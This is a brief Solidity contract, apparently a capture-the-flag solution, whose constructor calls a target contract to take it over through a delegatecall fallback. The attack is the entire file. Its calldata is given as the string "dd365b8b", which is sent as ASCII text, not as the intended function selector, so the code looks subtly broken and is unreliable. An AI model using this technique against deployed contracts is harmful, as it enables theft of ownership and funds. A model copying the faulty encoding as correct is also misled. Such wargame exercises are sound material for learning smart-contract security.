// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegationAttacker {
    constructor(address targetAddress) {
        (bool success, ) = targetAddress.call("dd365b8b");
        require(success);
    }
}
